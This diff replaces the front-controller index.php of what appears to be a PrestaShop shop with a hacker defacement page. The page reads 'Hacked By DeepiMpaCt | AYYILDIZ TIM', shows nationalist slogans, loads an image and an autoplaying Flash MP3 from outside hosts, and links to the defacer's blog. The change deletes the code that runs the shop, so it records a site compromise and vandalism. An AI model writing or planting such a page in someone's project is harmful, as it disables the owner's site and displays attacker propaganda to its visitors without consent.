@@ -1,29 +1,17 @@
-<?php
-/*
-* 2007-2011 PrestaShop 
-*
-* NOTICE OF LICENSE
-*
-* This source file is subject to the Open Software License (OSL 3.0)
-* that is bundled with this package in the file LICENSE.txt.
-* It is also available through the world-wide-web at this URL:
-* http://opensource.org/licenses/osl-3.0.php
-* If you did not receive a copy of the license and are unable to
-* obtain it through the world-wide-web, please send an email
-* to license@prestashop.com so we can send you a copy immediately.
-*
-* DISCLAIMER
-*
-* Do not edit or add to this file if you wish to upgrade PrestaShop to newer
-* versions in the future. If you wish to customize PrestaShop for your
-* needs please refer to http://www.prestashop.com for more information.
-*
-*  @author PrestaShop SA <contact@prestashop.com>
-*  @copyright  2007-2011 PrestaShop SA
-*  @version  Release: $Revision: 9068 $
-*  @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
-*  International Registered Trademark & Property of PrestaShop SA
-*/
+<html>
+<DeepiMpaCt>
+<head>
+<title>Hacked By DeepiMpaCt | AYYILDIZ TIM</title>
+</head>
+<body bgcolor="black">
+<center>
+<img src="http://img261.imageshack.us/img261/2927/calismam1yv0xr2.gif">
+<br><br>
+<font color="red" size="6"><b>Hacked By DeepiMpaCt</b></font><br><br><font color="red" size="4">One Turk Against The World</font>
+<p><object type="application/x-shockwave-flash" data="http://flash-mp3-player.net/medias/player_mp3_mini.swf" width="200" height="20"><param name="movie" value="http://flash-mp3-player.net/medias/player_mp3_mini.swf"><param name="bgcolor" value="#000000">
 
-require(dirname(__FILE__).'/config/config.inc.php');
-ControllerFactory::getController('IndexController')->run();
+<param name="FlashVars" value="mp3=http://www.ayyildiz.org/images/misyon.mp3&amp;autoplay=1"></object></p>
+<br><a href="http://bydeepimpact.blogspot.com"><font color=red size=1">DeepiMpaCt</font></a></center>
+</body>
+</DeepiMpaCt>
+</html>
